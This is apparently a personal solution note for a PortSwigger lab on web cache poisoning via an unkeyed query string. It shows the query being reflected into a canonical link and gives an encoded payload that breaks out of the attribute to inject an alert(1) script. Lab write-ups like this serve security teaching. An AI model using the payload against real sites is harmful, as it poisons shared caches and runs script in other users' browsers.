# [Lab: Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)

## Lab

This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.

## Analysis

unkeyed-query and query is inflected:

```http
GET /?unkeyed HTTP/1.1
```

- response:

  ```html
  <link rel="canonical" href='//id.web-security-academy.net/?unkeyed'/>
  ```

## Solutions

```http
GET /?evil=%27/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
```

- response:

  ```html
  <link rel="canonical" href='//id.web-security-academy.net/?evil='/><script>alert(1)</script>'/>
  ```
